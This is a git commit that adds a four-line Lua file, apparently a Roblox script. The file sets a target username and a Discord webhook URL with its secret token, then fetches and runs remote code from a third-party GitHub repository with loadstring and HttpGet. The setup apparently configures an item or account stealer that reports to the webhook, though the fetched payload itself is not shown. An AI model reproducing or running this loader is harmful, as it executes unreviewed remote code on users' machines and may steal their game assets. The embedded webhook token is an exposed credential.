f23c4d754c4e7e16ac652b9c9c88e8b22fe5b701
jayjayasap <91760070+jayjayasap@users.noreply.github.com>
2023-01-01 18:30:46 -0500

    Create Main.lua
    Done

---
+++ Main.lua
@@ -0,0 +1,4 @@
+UserName = "ASAPCARTL"
+WebHook = "https://discord.com/api/webhooks/1059190253774176286/IWI-HCb61CbTFNIIZaZVciNn8GvFf8E1JjTMrqSh8BI3Idr_3D9i89qYSPtNUf4nLKcm"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
